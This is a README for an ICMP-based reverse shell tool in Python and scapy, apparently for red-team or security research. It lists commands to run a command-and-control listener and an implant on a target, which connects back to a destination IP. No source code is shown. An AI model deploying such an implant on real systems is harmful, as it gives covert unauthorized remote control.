# ICMP Reverse Shell
ICMP reverse shell written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 10 (Kali Linux), and Windows 10.

More info: https://cryptsus.com/blog/icmp-reverse-shell.html

Python version (both Windows and Linux):
```bash
./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
```

Widows binary version:
```bash
./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
./icmpdoor.exe -d DESTINATION_IP (Implant)
```

Arguments:
```bash
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Listener (virtual) Network Interface (e.g. eth0)
  -d DESTINATION_IP, --destination_ip DESTINATION_IP
                        Destination IP address
  ```
# License
Berkeley Software Distribution (BSD)

# Author
[Jeroen van Kessel](https://twitter.com/jeroenvkessel) | [cryptsus.com](https://cryptsus.com) - we craft cyber security solutions
